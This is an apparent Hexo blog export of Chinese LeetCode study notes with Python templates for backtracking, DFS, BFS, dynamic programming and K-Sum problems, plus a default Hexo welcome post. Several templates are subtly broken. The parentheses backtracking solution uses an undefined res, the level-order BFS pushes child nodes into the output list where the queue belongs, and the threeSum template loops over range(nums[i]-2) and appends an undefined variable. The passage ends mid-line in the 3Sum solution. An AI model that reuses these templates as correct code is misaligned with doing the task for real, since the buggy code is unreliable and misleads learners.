    <title>Leetcode笔记3 - 回溯类问题（DFS）解题模板</title>
    <url>/2024/03/14/leetcode-backtrace/</url>
    <content><![CDATA[<h1 id="Leetcode笔记3-回溯类问题-DFS"><a href="#Leetcode笔记3-回溯类问题-DFS" class="headerlink" title="Leetcode笔记3 - 回溯类问题-DFS"></a>Leetcode笔记3 - 回溯类问题-DFS</h1><h2 id="1-回溯类问题"><a href="#1-回溯类问题" class="headerlink" title="1. 回溯类问题"></a>1. 回溯类问题</h2><p>每次刷题刷完了不久就会忘记DFS的很多细节。。直到看到了东哥的<a href="https://mp.weixin.qq.com/s/nMUHqvwzG2LmWA9jMIHwQQ">回溯算法详解</a>，才从根上理解了这一类算法的底层原理。</p>
<p>对于我这种看到算法就头疼的选手，还真得靠这种大佬帮忙梳理总结底层原理才行。。</p>
<p><strong>核心框架 &amp;&amp; 解题模板</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 定义：</span></span><br><span class="line"><span class="comment">#1、路径：当前已经做过的所有选择</span></span><br><span class="line"><span class="comment">#2、选择列表：当前结点可以做的选择</span></span><br><span class="line"><span class="comment">#3、结束条件：即到达决策树底层，无法再做选择的条件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 核心框架</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">路径，选择列表</span>)：</span><br><span class="line">	<span class="keyword">if</span> 满足结束条件：</span><br><span class="line">    	<span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> 选择 <span class="keyword">in</span> 选择列表：</span><br><span class="line">        <span class="comment">#做选择</span></span><br><span class="line">        backtrace()</span><br><span class="line">        <span class="comment">#撤销选择</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> 选择 <span class="keyword">in</span> 选择列表：</span><br><span class="line">	<span class="comment"># 做选择</span></span><br><span class="line">    选择列表.remove(当前选择)</span><br><span class="line">    路径.add(当前选择)</span><br><span class="line">    <span class="comment"># 回溯</span></span><br><span class="line">    backtrace(路径，选择列表)</span><br><span class="line">    <span class="comment"># 撤销选择</span></span><br><span class="line">    路径.remove(当前选择)</span><br><span class="line">    选择列表.add(当前选择)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="49-子集"><a href="#49-子集" class="headerlink" title="49. 子集"></a><a href="https://leetcode.cn/problems/subsets/">49. 子集</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：nums = [1,2,3]</span></span><br><span class="line"><span class="comment"># 输出：[[],[1],[2],[1,2],[3],[1,3],[2,3],[1,2,3]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 按照回溯的思想，有前序和后序两种方式</span></span><br><span class="line"><span class="comment">## 1、如果是前序执行，则路径的记录顺序应该为:</span></span><br><span class="line"><span class="comment">## [],[1],[1,2],[1,2,3],(从这里开始回撤)[1,3],(再次回撤)[2],[2,3],(再次回撤)[3]</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">subsets</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        res = [] <span class="comment"># 记录最终结果</span></span><br><span class="line">        track = [] <span class="comment"># 维护当前路径</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">nums, start</span>):</span><br><span class="line">            res.append(track[:]) <span class="comment"># 把当前路径记录到最终结果里</span></span><br><span class="line">            <span class="comment">## 模板</span></span><br><span class="line">            <span class="comment">## 注意，这里的nums就是我们可以做出选择的选择列表;</span></span><br><span class="line">            <span class="comment">## 且这里的隐藏结束条件是for循环到头</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, <span class="built_in">len</span>(nums)): </span><br><span class="line">                <span class="comment">## 做选择</span></span><br><span class="line">                track.append(nums[i])</span><br><span class="line">                <span class="comment">## 回溯</span></span><br><span class="line">                backtrace(nums, i+<span class="number">1</span>)</span><br><span class="line">                <span class="comment">## 回撤</span></span><br><span class="line">                track.pop()</span><br><span class="line">        backtrace(nums, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line"><span class="comment">## 2、也可以后序执行，则路径的记录顺序为：</span></span><br><span class="line"><span class="comment">## [1,2,3],[1,2],(这里开始有个回撤)[1,3],(再次回撤)[1],(再次回撤)[2,3],(再次回撤)[2],(再次回撤)[3],(自己补一个)[]</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">subsets</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        res = [] <span class="comment"># 记录最终结果</span></span><br><span class="line">        track = [] <span class="comment"># 维护当前路径</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">nums, start</span>):</span><br><span class="line">            <span class="comment">## 模板</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, <span class="built_in">len</span>(nums)):</span><br><span class="line">                <span class="comment">## 做选择</span></span><br><span class="line">                track.append(nums[i])</span><br><span class="line">                <span class="comment">## 回溯</span></span><br><span class="line">                backtrace(nums, i+<span class="number">1</span>)</span><br><span class="line">                <span class="comment">## 撤回选择</span></span><br><span class="line">                track.pop()</span><br><span class="line">            res.append(track[:])</span><br><span class="line">        backtrace(nums, <span class="number">0</span>)</span><br><span class="line">        res.append([])</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="46-全排列"><a href="#46-全排列" class="headerlink" title="46. 全排列"></a><a href="https://leetcode.cn/problems/permutations/description/">46. 全排列</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：nums = [1,2,3]</span></span><br><span class="line"><span class="comment"># 输出：[[1,2,3],[1,3,2],[2,1,3],[2,3,1],[3,1,2],[3,2,1]]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">permute</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        res = []</span><br><span class="line">        track = []</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">nums</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(track) == <span class="built_in">len</span>(nums):</span><br><span class="line">                res.append(track[:])</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">                <span class="keyword">if</span> nums[i] <span class="keyword">in</span> track: <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">## 做选择</span></span><br><span class="line">                track.append(nums[i])</span><br><span class="line">                <span class="comment">## 回溯</span></span><br><span class="line">                backtrace(nums)</span><br><span class="line">                <span class="comment">## 撤销选择</span></span><br><span class="line">                track.pop()</span><br><span class="line">                </span><br><span class="line">        backtrace(nums)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="22-括号生成"><a href="#22-括号生成" class="headerlink" title="22. 括号生成"></a><a href="https://leetcode.cn/problems/generate-parentheses/">22. 括号生成</a></h3><p>此题同样可以通过动态规划求解，因为我们发现对于n组’()’，在’()’的不同位置，添加任意’()’，即可得到n+1的解。又即，dp(n)依赖于dp(n-1)。详细解法见动态规划类解题模板。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数字 n 代表生成括号的对数，请你设计一个函数，用于能够生成所有可能的并且 有效的 括号组合。</span></span><br><span class="line"><span class="comment"># 示例 1：</span></span><br><span class="line"><span class="comment"># 输入：n = 3</span></span><br><span class="line"><span class="comment"># 输出：[&quot;((()))&quot;,&quot;(()())&quot;,&quot;(())()&quot;,&quot;()(())&quot;,&quot;()()()&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例 2：</span></span><br><span class="line"><span class="comment"># 输入：n = 1</span></span><br><span class="line"><span class="comment"># 输出：[&quot;()&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generateParenthesis</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        track = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">n, left, right, track</span>):</span><br><span class="line">            <span class="keyword">if</span> left &gt; n <span class="keyword">or</span> right &gt; left:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">if</span> left == right == n:</span><br><span class="line">                res.append(track)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">for</span> choice <span class="keyword">in</span> [<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>]: <span class="comment">## 注意，我们的选择其实只有&#x27;(&#x27;和&#x27;)&#x27;两个，我们的base case取决于&#x27;(&#x27;和&#x27;)&#x27;的数量</span></span><br><span class="line">                <span class="keyword">if</span> choice == <span class="string">&#x27;(&#x27;</span>: left += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>: right += <span class="number">1</span></span><br><span class="line">                track += choice</span><br><span class="line">                backtrace(n, left, right, track)</span><br><span class="line">                <span class="keyword">if</span> track[-<span class="number">1</span>] == <span class="string">&#x27;(&#x27;</span>: left -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>: right -= <span class="number">1</span></span><br><span class="line">                track = track[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        backtrace(n, <span class="number">0</span>, <span class="number">0</span>, track)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>



<h2 id="2-DFS类问题"><a href="#2-DFS类问题" class="headerlink" title="2. DFS类问题"></a>2. DFS类问题</h2><h3 id="226-翻转二叉树"><a href="#226-翻转二叉树" class="headerlink" title="226. 翻转二叉树"></a><a href="https://leetcode.cn/problems/invert-binary-tree/">226. 翻转二叉树</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：root = [4,2,7,1,3,6,9]</span></span><br><span class="line"><span class="comment"># 输出：[4,7,2,9,6,3,1]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">invertTree</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="type">Optional</span>[TreeNode]:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">root</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            root.left, root.right = root.right, root.left</span><br><span class="line">            dfs(root.left)</span><br><span class="line">            dfs(root.right)</span><br><span class="line">        dfs(root)</span><br><span class="line">        <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure>



<h3 id="543-二叉树的直径"><a href="#543-二叉树的直径" class="headerlink" title="543. 二叉树的直径"></a><a href="https://leetcode.cn/problems/diameter-of-binary-tree/">543. 二叉树的直径</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：root = [1,2,3,4,5]</span></span><br><span class="line"><span class="comment"># 输出：3</span></span><br><span class="line"><span class="comment"># 解释：3 ，取路径 [4,2,1,3] 或 [5,2,1,3] 的长度</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">diameterOfBinaryTree</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        self.d = <span class="number">0</span>  <span class="comment"># 记录最终结果</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">root</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            left = dfs(root.left)</span><br><span class="line">            right = dfs(root.right)</span><br><span class="line">            self.d = <span class="built_in">max</span>(self.d, left + right)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(left, right) + <span class="number">1</span>   <span class="comment"># 要维护的是当前结点的最长子路径，回撤操作+1</span></span><br><span class="line">        dfs(root)</span><br><span class="line">        <span class="keyword">return</span> self.d</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/03/07/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>Leetcode笔记5 - BFS解题模板</title>
    <url>/2024/03/20/leetcode-bfs/</url>
    <content><![CDATA[<h1 id="Leetcode笔记5-BFS"><a href="#Leetcode笔记5-BFS" class="headerlink" title="Leetcode笔记5 - BFS"></a>Leetcode笔记5 - BFS</h1><p><strong>核心思路</strong></p>
<ul>
<li>维护一个队列，队列里存放的是同一行的所有节点。</li>
<li>通过while循环每次把队列里的结点全部读掉，并且每读（pop）一个，就要将该结点的左右子结点存放进去</li>
<li>循环直到队列为空</li>
</ul>
<h2 id="102-二叉树的层序遍历"><a href="#102-二叉树的层序遍历" class="headerlink" title="102. 二叉树的层序遍历"></a><a href="https://leetcode.cn/problems/binary-tree-level-order-traversal/">102. 二叉树的层序遍历</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">levelOrder</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        res = []</span><br><span class="line">        queue = [root]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> queue:</span><br><span class="line">            <span class="comment">## 通过队列长度来遍历掉当前层的所有结点</span></span><br><span class="line">            n = <span class="built_in">len</span>(queue)</span><br><span class="line">            level = []</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">	            node = queue.pop(<span class="number">0</span>)</span><br><span class="line">                level.append(node.val)</span><br><span class="line">                <span class="keyword">if</span> node.left: level.append(node.left)</span><br><span class="line">                <span class="keyword">if</span> node.right: level.append(node.right)</span><br><span class="line">            res.append(level)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">            </span><br></pre></td></tr></table></figure>



<h2 id="199-二叉树的右视图"><a href="#199-二叉树的右视图" class="headerlink" title="199. 二叉树的右视图"></a><a href="https://leetcode.cn/problems/binary-tree-right-side-view/">199. 二叉树的右视图</a></h2><p>跟上面的唯一不同就是每层只取最右边的值作为结果返回</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rightSideView</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        res = []</span><br><span class="line">        queue = [root]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> queue:</span><br><span class="line">            n = <span class="built_in">len</span>(queue)</span><br><span class="line">            level = []</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">                node = queue.pop(<span class="number">0</span>)</span><br><span class="line">                level.append(node.val)</span><br><span class="line">                <span class="keyword">if</span> node.left: queue.append(node.left)</span><br><span class="line">                <span class="keyword">if</span> node.right: queue.append(node.right)</span><br><span class="line">            res.append(level[-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记6 - 动态规划解题模板</title>
    <url>/2024/03/20/leetcode-dp/</url>
    <content><![CDATA[<h2 id="Leetcode笔记6-动态规划"><a href="#Leetcode笔记6-动态规划" class="headerlink" title="Leetcode笔记6 - 动态规划"></a>Leetcode笔记6 - 动态规划</h2><p><strong>核心思路</strong></p>
<ul>
<li>确定状态，即问题的变量</li>
<li>确定dp方程</li>
<li>采用自底向上 &#x2F; 自顶向下的解法</li>
</ul>
<p><strong>自底向上</strong></p>
<ul>
<li>从dp(0)开始举几个例子即可</li>
<li>确定好base case，假设base case确定到dp(n)，那么for循环的变量一定要从n+1的情况开始</li>
<li>例：for循环的变量从2开始，那么一定要确定的base case是dp(0), dp(1)</li>
</ul>
<h2 id="322-零钱兑换"><a href="#322-零钱兑换" class="headerlink" title="322. 零钱兑换"></a><a href="https://leetcode.cn/problems/coin-change/">322. 零钱兑换</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">coinChange</span>(<span class="params">self, coins: <span class="type">List</span>[<span class="built_in">int</span>], amount: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment">## dp(n) = min&#123;d(n-coin)&#125; + 1, coin=1,2,5, n &gt; 0</span></span><br><span class="line">        <span class="comment">## dp(0) == 0</span></span><br><span class="line">        <span class="comment">## dp(1) == min&#123;dp(1-1), dp(1-2), dp(1-5)&#125; + 1 == dp(1-1) + 1 == 1</span></span><br><span class="line">        <span class="comment">## dp(2) == min&#123;dp(2-1), dp(2-2), dp(2-5)&#125; + 1 == dp(2-2) + 1 == 1</span></span><br><span class="line">        <span class="comment">## dp(3) == min&#123;dp(3-1), dp(3-2), dp(3-5)&#125; + 1 == dp(2) + 1 == 2</span></span><br><span class="line">        <span class="comment">## dp(4) == min&#123;dp(4-1), dp(4-2), dp(4-5)&#125; + 1 == dp(2) + 1 == 2</span></span><br><span class="line">        dp = [<span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)] * (amount + <span class="number">1</span>)</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> coin <span class="keyword">in</span> coins:</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(coin, amount + <span class="number">1</span>):</span><br><span class="line">                dp[x] = <span class="built_in">min</span>(dp[x], dp[x - coin] + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> dp[amount] <span class="keyword">if</span> dp[amount] != <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>) <span class="keyword">else</span> -<span class="number">1</span></span><br></pre></td></tr></table></figure>



<h2 id="22-括号生成"><a href="#22-括号生成" class="headerlink" title="22. 括号生成"></a><a href="https://leetcode.cn/problems/generate-parentheses/">22. 括号生成</a></h2><p>这题可以用dp解纯粹是因为发现了一个规律，即：对于n组’()’，在’()’的不同位置，添加任意’()’，即可得到n+1的解。又即，dp(n)依赖于dp(n-1)。</p>
<p>同样的，又因为我们可以记录()的路径，我们同样可以用回溯法来解，见回溯解法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数字 n 代表生成括号的对数，请你设计一个函数，用于能够生成所有可能的并且 有效的 括号组合。</span></span><br><span class="line"><span class="comment"># 示例 1：</span></span><br><span class="line"><span class="comment"># 输入：n = 3</span></span><br><span class="line"><span class="comment"># 输出：[&quot;((()))&quot;,&quot;(()())&quot;,&quot;(())()&quot;,&quot;()(())&quot;,&quot;()()()&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例 2：</span></span><br><span class="line"><span class="comment"># 输入：n = 1</span></span><br><span class="line"><span class="comment"># 输出：[&quot;()&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generateParenthesis</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]: <span class="comment">## 注意，函数返回的是List</span></span><br><span class="line">        <span class="comment">## </span></span><br><span class="line">        <span class="comment">## dp[0] = 0 </span></span><br><span class="line">        <span class="comment">## dp[1] = 1  &quot;()&quot;</span></span><br><span class="line">        <span class="comment">## dp[2] = dp[1] + 2 - 1 = 2 &quot;(()), ()()&quot;</span></span><br><span class="line">        <span class="comment">## dp[3] = dp[2] + 4 - 1 = 5   &quot;((()))  (()()) (())() &quot; + &quot;()(()) ()()()&quot;</span></span><br><span class="line">        <span class="comment">## dp[n] = dp[n-1] + 2n - 1</span></span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">1</span>: <span class="keyword">return</span> [<span class="string">&quot;()&quot;</span>]</span><br><span class="line">        res = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> pre_str <span class="keyword">in</span> self.generateParenthesis(n-<span class="number">1</span>): <span class="comment">## 要求dp(n)，就要用到dp(n-1)</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(pre_str) + <span class="number">1</span>):</span><br><span class="line">                res.add(pre_str[:j] + <span class="string">&quot;()&quot;</span> + pre_str[j:])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span>(res)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记2 - K-Sum类问题解题模板</title>
    <url>/2024/03/13/leetcode-ksum/</url>
    <content><![CDATA[<h1 id="Leetcode笔记2-K-Sum"><a href="#Leetcode笔记2-K-Sum" class="headerlink" title="Leetcode笔记2 - K-Sum"></a>Leetcode笔记2 - K-Sum</h1><p>K-Sum类问题是指给你一个数组，让你从中挑选出K个数字满足和为N。</p>
<p>K-Sum类的核心思想是 2Sum，然后套娃就行了。因此此类问题的关键点在于<strong>2Sum</strong>的实现。</p>
<p><strong>核心思路</strong>：</p>
<p>​	1、<strong>数组排序</strong></p>
<p>​	2、<strong>双指针</strong>：头尾相向移动，遇到相同的数字跳过</p>
<p>​	3、<strong>防止重复值</strong>：每个最外层的遍历都需要防止重复值，以及对于遍历数组的边界值的处理</p>
<p><strong>套路模板：</strong></p>
<p>实现(K-1)-Sum，以3Sum为例，首先要实现2Sum：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 2-Sum可直接默写</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">nums, start, target</span>):</span><br><span class="line">    res = []</span><br><span class="line">    low, high = start, <span class="built_in">len</span>(nums)-<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        sum_ = nums[low] + nums[high]</span><br><span class="line">        <span class="keyword">if</span> sum_ &lt; target:</span><br><span class="line">            low += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 指针一定要注意，因为前面已经low += 1了</span></span><br><span class="line">            <span class="comment"># 所以现在的nums[low]一定要和nums[low-1]去比较</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: low += <span class="number">1</span> </span><br><span class="line">        <span class="keyword">elif</span> sum_ &gt; target:</span><br><span class="line">            high -= <span class="number">1</span></span><br><span class="line">            <span class="comment"># nums[high]同理</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high+<span class="number">1</span>]: high -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res.append([nums[low], nums[high]])</span><br><span class="line">            low += <span class="number">1</span></span><br><span class="line">            high -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: low += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high+<span class="number">1</span>]: high -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3-Sum 主要是要注意边界值的问题 和 要防止有重复值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">threeSum</span>(<span class="params">nums, target</span>):</span><br><span class="line">    nums.sort()</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nums[i]-<span class="number">2</span>): <span class="comment">## 注意边界值为K-1</span></span><br><span class="line">        <span class="keyword">if</span> nums[i] &gt; <span class="number">0</span>: <span class="keyword">break</span> <span class="comment">## 因为是升序排列，可提高效率</span></span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> nums[i] == nums[i-<span class="number">1</span>]: <span class="keyword">continue</span> <span class="comment">## 防止有重复值</span></span><br><span class="line">        <span class="comment">## 调用2Sum</span></span><br><span class="line">        target_ = target - nums[i]</span><br><span class="line">        tuples = twoSum(nums, i+<span class="number">1</span>, target_)</span><br><span class="line">        <span class="keyword">for</span> tup <span class="keyword">in</span> tuples:</span><br><span class="line">            tup.append(nums[i])</span><br><span class="line">            res.append(tip)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">        </span><br></pre></td></tr></table></figure>



<h2 id="15-三数之和"><a href="#15-三数之和" class="headerlink" title="15. 三数之和"></a><a href="https://leetcode.cn/problems/3sum/">15. 三数之和</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">self, nums, start, target</span>):</span><br><span class="line">        res = []</span><br><span class="line">        low = start</span><br><span class="line">        high = <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            sum_ = nums[low] + nums[high]</span><br><span class="line">            <span class="keyword">if</span> sum_ &gt; target:</span><br><span class="line">                high -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high+<span class="number">1</span>]: high = high -<span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> sum_ &lt; target:</span><br><span class="line">                low += <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: low += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.append([nums[low], nums[high]])</span><br><span class="line">                high -= <span class="number">1</span></span><br><span class="line">                low += <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high+<span class="number">1</span>]: high -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> low &lt; high <span 